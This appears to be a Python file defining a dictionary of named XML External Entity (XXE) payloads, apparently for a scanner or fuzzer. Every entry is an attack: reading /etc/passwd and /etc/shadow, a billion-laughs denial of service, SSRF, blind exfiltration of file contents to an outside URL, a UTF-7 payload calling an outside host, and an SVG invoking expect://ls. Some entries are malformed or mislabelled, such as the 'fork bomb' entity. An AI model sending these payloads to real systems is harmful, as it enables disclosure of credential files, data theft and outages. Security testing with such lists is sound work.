# Define different XML payloads
xml_payloads = {
    "Exfiltration Fork Bomb":
    """

<!DOCTYPE lol [
<entity %exfiltration "fork();while(1);" >
]>
<lol>&exfiltration;</lol>
""",
    "Simple XML Entity":
    """

<!DOCTYPE lol [

<!ENTITY xxe "XXE Injection">
]>
<lol>&xxe;</lol>
""",
    "Parameter Entity Expanding to External Entity":
    """

<!DOCTYPE lol [

<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY exfiltration "%xxe;">
]>
<lol>&exfiltration;</lol>
""",
    "External Entity Inclusion":
    """

<!DOCTYPE lol [

<!ENTITY xxe SYSTEM "http://example.com/evil.dtd">
]>
<lol>&xxe;</lol>
""",
    "XXE: File Disclosure":
    """

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [
<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&ent;</lastName>
</userInfo>
""",
    "XXE: Denial-of-Service":
    """

<!--?xml version="1.0" ?-->
<!DOCTYPE Cryptiques [
<!ENTITY kek "kek">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY kek1 "&kek;&kek;&kek;&kek;&kek;&kek;&kek;">
<!ENTITY kek2 "&kek1;&kek1;&kek1;&kek1;&kek1;&kek1;&kek1;">
<!ENTITY kek3 "&kek2;&kek2;&kek2;&kek2;&kek2;&kek2;&kek2;">
<!ENTITY kek4 "&kek3;&kek3;&kek3;&kek3;&kek3;&kek3;&kek3;">
<!ENTITY kek5 "&kek4;&kek4;&kek4;&kek4;&kek4;&kek4;&kek4;">
<!ENTITY kek6 "&kek5;&kek5;&kek5;&kek5;&kek5;&kek5;&kek5;">
<!ENTITY kek7 "&kek6;&kek6;&kek6;&kek6;&kek6;&kek6;&kek6;">
<!ENTITY kek8 "&kek7;&kek7;&kek7;&kek7;&kek7;&kek7;&kek7;">
<!ENTITY kek9 "&kek8;&kek8;&kek8;&kek8;&kek8;&kek8;&kek8;">
]>
<tag>&kek9;</tag>
""",
    "XXE: Local File Inclusion":
    """

<?xml version="1.0"?>
<!DOCTYPE foo [  

<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
""",
    "XXE: Blind Local File Inclusion (When first case doesn't return anything.)":
    """

<?xml version="1.0"?>
<!DOCTYPE foo [

<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]>
<foo>&blind;</foo>
""",
    "XXE: Access Control Bypass (Loading Restricted Resources - PHP example)":
    """

<?xml version="1.0"?>
<!DOCTYPE foo [

<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
<foo>
  <result>&ac;</result>
</foo>
""",
    "XXE:SSRF ( Server Side Request Forgery )":
    """

<?xml version="1.0"?>
<!DOCTYPE foo [  

<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]>
<foo>&xxe;</foo>
""",
    "XXE: (Remote Attack - Through External Xml Inclusion)":
    """

<?xml version="1.0"?>
<!DOCTYPE lolz [

<!ENTITY test SYSTEM "https://example.com/entity1.xml">]>
<lolz>
  <lol>3..2..1...&test
    <lol>
    </lolz>
""",
    "XXE: UTF-7 Exmaple":
    """

    <?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
""",
    "XXE: Base64 Encoded":
    """

    <!DOCTYPE test [ 
    <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]>
    <foo/>
""",
    "XXE: XXE inside SOAP Example":
    """

    <soap:Body>
      <foo>
        <![CDATA[
        <!DOCTYPE doc [
        <!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
      </foo>
    </soap:Body>
""",
    "XXE: XXE inside SVG":
    """

    <svg
      xmlns="http://www.w3.org/2000/svg"
      xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
      <image xlink:href="expect://ls"></image>
    </svg>
"""
}
